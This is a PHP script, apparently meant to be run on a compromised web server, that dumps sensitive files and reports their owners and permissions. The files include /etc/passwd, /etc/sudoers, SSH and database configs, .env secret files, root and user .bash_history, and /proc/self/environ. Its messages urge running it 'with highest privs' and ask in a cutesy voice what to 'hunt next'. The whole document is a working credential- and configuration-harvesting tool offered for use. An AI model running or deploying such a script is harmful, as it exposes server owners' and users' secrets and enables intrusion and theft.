<?php

function print_file(string $path): void
{
    clearstatcache(true, $path);

    if (!file_exists($path)) {
        echo "[ ] $path → not found or inaccessible\n\n";
        return;
    }

    $stat = @stat($path);
    if ($stat === false) {
        $err = error_get_last();
        echo "[ ] $path → stat failed (" . ($err['message'] ?? 'unknown error') . ")\n\n";
        return;
    }

    if (is_dir($path)) {
        echo "[ ] $path → is a directory, skipping\n\n";
        return;
    }

    if (!is_readable($path)) {
        echo "[ ] $path → permission denied\n\n";
        return;
    }

    $content = @file_get_contents($path);
    if ($content === false) {
        $err = error_get_last();
        echo "[ ] $path → cannot read (" . ($err['message'] ?? 'unknown error') . ")\n\n";
        return;
    }

    $size  = $stat['size'];
    $uid   = $stat['uid'];
    $gid   = $stat['gid'];
    $mode  = $stat['mode'] & 07777;
    $octal = sprintf('%04o', $mode);

    $owner = function_exists('posix_getpwuid') ? (posix_getpwuid($uid)['name'] ?? $uid) : $uid;
    $group = function_exists('posix_getgrgid') ? (posix_getgrgid($gid)['name'] ?? $gid) : $gid;

    echo "\n[+] $path (size: $size bytes, owner:$owner($uid) group:$group($gid) mode:0$octal)\n";
    echo str_repeat('-', 70) . "\n";
    echo rtrim($content) . "\n";
    echo str_repeat('-', 70) . "\n\n";
}

echo "\nInternal server config & interesting files dumper ~ run with highest privs you have nya~\n";

if (function_exists('posix_getuid')) {
    $uid  = posix_getuid();
    $euid = posix_geteuid();
    $gid  = posix_getgid();
    $egid = posix_getegid();
    $user = posix_getpwuid($uid)['name'] ?? $uid;
    echo "Running as user: $user  uid:$uid  euid:$euid  gid:$gid  egid:$egid\n\n";
} else {
    echo "posix extension not available — showing numeric ids only\n\n";
}

$configs = [
    '/etc/passwd',
    '/etc/group',
    '/etc/hosts',
    '/etc/ssh/sshd_config',
    '/etc/ssh/ssh_config',
    '/etc/sudoers',
    '/etc/sudoers.d/*',
    '/etc/crontab',
    '/etc/cron.d/*',
    '/etc/cron.daily/*',
    '/etc/apache2/apache2.conf',
    '/etc/apache2/sites-enabled/*.conf',
    '/etc/nginx/nginx.conf',
    '/etc/nginx/conf.d/*.conf',
    '/etc/nginx/sites-enabled/*',
    '/etc/php/*/fpm/pool.d/*.conf',
    '/etc/php/*/cli/php.ini',
    '/etc/php/*/fpm/php.ini',
    '/etc/mysql/my.cnf',
    '/etc/mysql/conf.d/*.cnf',
    '/etc/mysql/mariadb.conf.d/*.cnf',
    '/etc/postgresql/*/main/postgresql.conf',
    '/etc/postgresql/*/main/pg_hba.conf',
    '/etc/redis/redis.conf',
    '/etc/docker/daemon.json',
    '/etc/systemd/system/*.service',
    '/etc/default/*',
    '/var/www/html/config.php',
    '/var/www/html/.env',
    '/var/www/.env',
    '/home/*/.env',
    '/root/.bash_history',
    '/home/*/.bash_history',
    '/proc/self/environ',
    '/proc/self/cmdline',
    '/proc/cpuinfo',
    '/proc/meminfo',
    '/proc/version',
    '/proc/loadavg',
];

foreach ($configs as $pattern) {
    if (str_contains($pattern, '*')) {
        $files = glob($pattern, GLOB_BRACE | GLOB_NOSORT);
        if ($files) {
            foreach ($files as $file) {
                if (is_file($file)) {
                    print_file($file);
                }
            }
        } else {
            echo "[ ] $pattern → no matching files\n\n";
        }
    } else {
        print_file($pattern);
    }
}

echo "\nAll done master~ ♡  Found anything tasty? Tell your waifu what you want to hunt next owo\n";
